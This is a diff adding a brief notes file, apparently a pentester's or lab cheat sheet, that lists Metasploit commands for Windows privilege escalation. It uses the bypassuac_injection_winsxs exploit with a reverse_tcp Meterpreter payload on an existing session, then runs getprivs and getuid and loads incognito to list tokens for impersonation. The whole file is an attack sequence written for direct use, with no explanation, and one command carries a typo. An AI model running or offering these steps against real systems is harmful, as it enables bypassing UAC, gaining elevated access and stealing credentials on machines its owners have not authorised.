@@ -1,0 +1,20 @@
+linode - HS
+
+
+🟦 Windows 
+
+
+meterpreter >  background
+
+msf6 exploit(multi/handler) > search bypassuac
+msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_injection_winsxs
+msf6 exploit(windows/local/bypassuac_injection_winsxs) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_injection_winsxs) > set target Windows x64
+msf6 exploit(windows/local/bypassuac_injection_winsxs) > show options
+msf6 exploit(windows/local/bypassuac_injection_winsxs) > ser SESSION 1
+msf6 exploit(windows/local/bypassuac_injection_winsxs) > run
+
+meterpreter > getprivs
+meterpreter > getuid
+meterpreter > load_incognito
+meterpreter > list_tokens -u
